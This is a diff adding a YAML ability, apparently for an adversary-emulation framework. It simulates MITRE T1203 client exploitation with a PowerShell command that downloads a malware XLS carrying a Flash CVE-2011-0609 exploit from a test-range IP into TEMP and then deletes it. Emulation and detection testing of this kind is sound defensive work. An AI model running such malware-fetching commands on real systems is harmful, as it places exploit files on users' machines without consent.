@@ -1,0 +1,35 @@
+- tactic: execution
+  technique_name: Exploitation for Client Execution
+  technique_id: T1203
+  name: 'Malware: Download Flash CVE-2011-0609 XLS file'
+  description: Adversaries exploit vulnerabilities in client applications, often due
+    to insecure coding, to execute arbitrary code and gain remote access to systems.
+    These vulnerabilities are valuable targets for exploitation, as they allow attackers
+    to compromise systems by leveraging commonly used files that users expect to encounter.
+  executors:
+  - name: psh
+    platform: windows
+    command: "Invoke-WebRequest http://198.18.128.193/malware/crscan.xls -OutFile\
+      \ $env:TEMP/crscan.xls; \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\\
+      crscan.xls\" -Force"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: d3f5a22f-fff7-41a6-a1fa-e1fede5d196b
